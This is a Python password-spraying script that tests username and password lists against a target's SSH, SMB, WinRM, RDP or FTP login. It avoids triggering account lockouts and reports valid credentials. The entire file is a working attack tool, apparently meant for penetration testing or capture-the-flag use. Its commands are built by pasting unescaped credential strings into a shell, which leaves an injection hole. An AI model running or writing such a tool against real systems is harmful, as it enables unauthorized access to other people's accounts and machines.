```python
#!/usr/bin/env python3
"""
smart_brute.py - Lockout-aware password spraying
Usage: python3 smart_brute.py -t 10.10.10.5 -u users.txt -p passwords.txt -s ssh
"""

import argparse
import subprocess
import time
import os

R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
C = '\033[96m'
B = '\033[1m'
X = '\033[0m'

class SmartBrute:
    def __init__(self, target, users, passwords, service, delay=1, lockout_threshold=5):
        self.target = target
        self.users = users
        self.passwords = passwords
        self.service = service
        self.delay = delay
        self.lockout_threshold = lockout_threshold
        self.valid_creds = []
        self.locked_accounts = []
        
    def test_ssh(self, user, password):
        cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {user}@{self.target} 'exit' 2>/dev/null"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return result.returncode == 0
    
    def test_smb(self, user, password):
        cmd = f"smbclient -U '{user}%{password}' -L //{self.target} -c 'exit' 2>/dev/null"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        
        if "NT_STATUS_ACCOUNT_LOCKED_OUT" in result.stderr:
            self.locked_accounts.append(user)
            return False
        return result.returncode == 0
    
    def test_winrm(self, user, password):
        cmd = f"crackmapexec winrm {self.target} -u '{user}' -p '{password}' 2>/dev/null | grep -q 'Pwn3d!'"
        result = subprocess.run(cmd, shell=True)
        return result.returncode == 0
    
    def test_rdp(self, user, password):
        cmd = f"xfreerdp /v:{self.target} /u:{user} /p:'{password}' /cert:ignore +auth-only 2>&1 | grep -q 'Authentication only'"
        result = subprocess.run(cmd, shell=True)
        return result.returncode == 0
    
    def test_ftp(self, user, password):
        cmd = f"ftp -n {self.target} <<EOF\nquote USER {user}\nquote PASS {password}\nquit\nEOF 2>&1 | grep -q '230'"
        result = subprocess.run(cmd, shell=True)
        return result.returncode == 0
    
    def spray(self):
        print(f"{C}[*] Starting {self.service} password spray on {self.target}{X}")
        print(f"{C}[*] Users: {len(self.users)}, Passwords: {len(self.passwords)}{X}")
        print(f"{Y}[!] Lockout threshold: {self.lockout_threshold}{X}\n")
        
        for password in self.passwords[:self.lockout_threshold]:
            print(f"{C}[*] Trying password: '{password}'{X}")
            
            for user in self.users:
                if user in self.locked_accounts:
                    continue
                
                valid = False
                if self.service == "ssh":
                    valid = self.test_ssh(user, password)
                elif self.service == "smb":
                    valid = self.test_smb(user, password)
                elif self.service == "winrm":
                    valid = self.test_winrm(user, password)
                elif self.service == "rdp":
                    valid = self.test_rdp(user, password)
                elif self.service == "ftp":
                    valid = self.test_ftp(user, password)
                
                if valid:
                    print(f"{G}[+] VALID: {user}:{password}{X}")
                    self.valid_creds.append((user, password))
                else:
                    print(f"  {Y}[!] Failed: {user}:{password}{X}")
                
                time.sleep(self.delay)
        
        return self.valid_creds

def main():
    ap = argparse.ArgumentParser(description="Smart Password Sprayer")
    ap.add_argument("-t", "--target", required=True)
    ap.add_argument("-u", "--users", required=True, help="User file or single user")
    ap.add_argument("-p", "--passwords", required=True, help="Password file or single password")
    ap.add_argument("-s", "--service", required=True, choices=["ssh","smb","winrm","rdp","ftp"])
    ap.add_argument("--delay", type=float, default=1, help="Delay between attempts")
    ap.add_argument("--lockout", type=int, default=5, help="Lockout threshold")
    args = ap.parse_args()
    
    users = []
    if os.path.exists(args.users):
        with open(args.users) as f:
            users = [line.strip() for line in f if line.strip()]
    else:
        users = [args.users]
    
    passwords = []
    if os.path.exists(args.passwords):
        with open(args.passwords) as f:
            passwords = [line.strip() for line in f if line.strip()]
    else:
        passwords = [args.passwords]
    
    brute = SmartBrute(args.target, users, passwords, args.service, args.delay, args.lockout)
    results = brute.spray()
    
    print(f"\n{G}[+] Valid credentials found: {len(results)}{X}")
    for user, password in results:
        print(f"  {user}:{password}")

if __name__ == "__main__":
    main()
```